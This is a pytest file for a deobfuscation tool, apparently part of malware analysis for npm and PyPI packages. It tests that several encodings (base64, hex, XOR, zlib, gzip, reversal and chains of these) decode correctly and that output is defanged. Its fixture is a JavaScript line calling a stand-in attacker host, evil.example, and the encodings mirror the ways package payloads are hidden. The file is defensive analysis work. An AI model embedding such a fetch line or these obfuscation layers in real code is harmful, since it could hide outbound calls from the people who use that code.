import base64
import gzip
import subprocess
import sys
import zlib

import pytest

from tools.common import decode, paths

PLAIN = b"require('https').get('https://evil.example/x')"


@pytest.mark.parametrize("encoded, ops", [
    (base64.b64encode(PLAIN), ["base64"]),
    (base64.urlsafe_b64encode(b"\xfb\xff" + PLAIN).rstrip(b"="), ["base64"]),
    (PLAIN.hex().encode(), ["hex"]),
    ("".join(f"\\x{b:02x}" for b in PLAIN).encode(), ["unescape"]),
    (", ".join(str(b) for b in PLAIN).encode(), ["charcodes"]),
    (PLAIN[::-1], ["reverse"]),
    (bytes(b ^ ord("k") for b in PLAIN), ["xor:k"]),
    (bytes(b ^ 0x2A for b in PLAIN), ["xor:0x2a"]),
    (zlib.compress(PLAIN), ["zlib"]),
    (zlib.compress(PLAIN)[2:-4], ["zlib"]),
    (gzip.compress(PLAIN), ["gzip"]),
    (base64.b64encode(zlib.compress(PLAIN[::-1])), ["base64", "zlib", "reverse"]),
])
def test_round_trip(encoded, ops):
    assert decode.run(encoded, ops).endswith(PLAIN)


def test_cli_prints_defanged():
    proc = subprocess.run([sys.executable, str(paths.CODE_ROOT / "tools" / "common" / "decode.py"), "base64"],
                          input=base64.b64encode(PLAIN), capture_output=True)
    assert proc.returncode == 0
    assert b"hxxps://evil[.]example/x" in proc.stdout and b"https://" not in proc.stdout


def test_unknown_op():
    with pytest.raises(ValueError):
        decode.run(b"x", ["rot13"])


def test_every_decoder_is_documented_and_every_named_decoder_resolves():
    import importlib
    import json
    import pkgutil

    from tools.common import contract, decoders, paths

    for mod in pkgutil.iter_modules(decoders.__path__):
        decoders.load_decoder(mod.name)
        doc = importlib.import_module(f"tools.common.decoders.{mod.name}").__doc__ or ""
        for header in ("Family:", "Reverses:", "Per sample:"):
            assert header in doc, (mod.name, header)
    records = [contract.read_record(p) for eco in ("npm", "pypi") for p in (paths.REPORTS / eco).glob("*.md")]
    records += [json.loads(p.read_text()) for p in paths.ROOT.glob("evals/gate-analysis/fixtures/**/*.json")]
    for rec in records:
        for d in ((rec.get("normalisation") or {}).get("derivations") or []):
            if d.get("recipe") == "decode_spec":
                decoders.load_decoder(d["params"]["decoder"])
